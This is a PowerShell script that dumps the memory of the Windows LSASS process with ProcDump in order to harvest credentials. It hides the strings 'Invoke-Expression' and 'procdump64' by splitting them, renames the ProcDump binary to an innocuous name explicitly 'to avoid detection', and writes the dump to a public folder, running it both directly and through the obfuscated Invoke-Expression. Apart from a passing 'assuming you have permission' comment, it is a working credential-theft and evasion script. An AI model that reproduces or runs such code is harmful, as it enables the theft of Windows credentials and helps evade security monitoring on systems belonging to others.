# Step 1: Define an obfuscated string for invoking ProcDump (assuming you have permission)
# Obfuscated command string
$cmdPart1 = "Invo"
$cmdPart2 = "ke-Ex"
$cmdPart3 = "pression"
$obfuscatedCommand = $cmdPart1 + $cmdPart2 + $cmdPart3  # Results in "Invoke-Expression"

# Step 2: Concatenate PowerShell module command and define file path
$procDump = "pro" + "cdump64"  # Obfuscated "procdump64"
$filePath = "C:\Users\rekal\OneDrive\Belgeler\" + $procDump + ".exe"  # Full path to procdump64.exe

# Step 3: Rename ProcDump to avoid detection
$newName = "yilmazdegirmenci.exe"
Rename-Item -Path $filePath -NewName $newName  # Rename to a less suspicious name
$renamedFilePath = "C:\Users\rekal\OneDrive\Belgeler\" + $newName

# Step 4: Define the dump path and get LSASS process ID
$dumpPath = "C:\Users\Public\lsass.dmp"
$processId = (Get-Process "lsass").Id
Write-Output ("Found LSASS process. PID: " + $processId)

# Execute the renamed ProcDump
& $renamedFilePath -ma $processId $dumpPath  # Execute with the renamed tool

# Step 5: Use the obfuscated command to invoke PowerShell dynamically (example for executing the dump command)
$fullCommand = "Start-Process -FilePath `"$renamedFilePath`" -ArgumentList `"-ma $processId $dumpPath`" -NoNewWindow -Wait"
& $obfuscatedCommand $fullCommand  # Executes the obfuscated command

# Confirmation message
Write-Output "Process memory dump completed and saved to $dumpPath"
